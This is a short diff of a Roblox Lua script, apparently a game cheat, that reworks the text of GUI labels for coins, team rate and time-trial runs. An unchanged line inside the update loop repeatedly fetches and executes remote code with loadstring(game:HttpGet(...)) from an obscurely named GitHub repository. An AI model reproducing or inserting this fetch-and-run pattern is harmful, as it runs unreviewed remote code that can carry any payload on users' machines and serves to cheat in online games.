@@ -141,18 +141,18 @@ local function startGuiUpdater()
     while true do
         local currentTime = os.time()
 
-        coinsLabel.Text   = Formatint(getCurrencyAmount("HalloweenCoins")) .. " | COINS"
+        coinsLabel.Text   = Formatint(getCurrencyAmount("HalloweenCoins")) .. " COINS"
         updateLabelSize(coinsLabel)
 
         chanceLabel.Text  = tostring(_G.TotalRate or 0) .. "/s | TEAM"
         updateLabelSize(chanceLabel)
 
-        timeTrialLabel.Text = "Time Trial: " .. tostring(getRunsLeft()) .. "/10"
+        timeTrialLabel.Text = tostring(getRunsLeft()) .. "/10"
         updateLabelSize(timeTrialLabel)
 		if getRunsLeft() > 0 then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/teleport_w1234"))()
 		end
-        pointsLabel.Text = "Điểm: " .. tostring(getTimeTrialPoints())
+        pointsLabel.Text = tostring(getTimeTrialPoints())
         updateLabelSize(pointsLabel)
 
         task.wait(10)
